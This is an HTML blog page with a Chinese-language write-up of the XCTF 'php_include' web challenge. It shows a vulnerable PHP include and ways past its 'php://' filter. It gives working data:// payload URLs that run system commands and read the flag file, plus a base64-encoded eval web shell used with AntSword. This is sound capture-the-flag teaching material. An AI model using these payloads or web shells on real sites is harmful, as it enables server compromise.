@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XCTF:Web-php_include - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="源码
+&amp;lt;?php
+show_source(__FILE__);
+echo $_GET[&#39;hello&#39;];
+$page=$_GET[&#39;page&#39;];
+while (strstr($page, &#34;,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">XCTF:Web-php_include</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">XCTF:Web-php_include</h1>
+        <div class="stuff">
+            <span>三月 15, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>源码</p>
+<pre><code>&lt;?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, "php://")) {
+    $page=str_replace("php://", "", $page);  //  将“php://”替换成空可以采用大写双写等绕过
+}
+include($page);
+?&gt;</code></pre>
+<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\ece5d3f5afef9925e795f126f3a6a87.png" alt="ece5d3f5afef9925e795f126f3a6a87"></p>
+<p>结果</p>
+<p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082546375.png" alt="20200525082546375"></p>
+<p>然后</p>
+<p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082600649.png" alt="20200525082600649"></p>
+<p>查看源码</p>
+<p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082612785.png" alt="20200525082612785"></p>
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>既然过滤了php://的伪协议 我们可以使用其他协议来做这里使用data://伪协议</p>
+<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
+<p>使用方法:data://text/plain;base64,xxxx(base64编码后的数据)</p>
+<!--?php system("dir")?--><p> base64编码后使用</p>
+<pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b </code></pre>
+<p>(注意编码后的+号要URL编码)</p>
+<!--?php system("cat fl4gisisish3r3.php")?--><p> base64编码后使用</p>
+<pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</code></pre>
+<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><pre><code>http://111.200.241.244:36906/?page=data://text/plain/;base64,Jmx0Oz9waHAgZXZhbCgkX1BPU1RbSDNuZ10pOyA/Jmd0Ow==</code></pre>
+<p>这里采用base64加密木马</p>
+<p>蚁剑连接</p>
+<h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>御剑扫描不多赘述</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">法二</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">3.</span> <span class="toc-text">法三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B"><span class="toc-number">4.</span> <span class="toc-text">法四</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
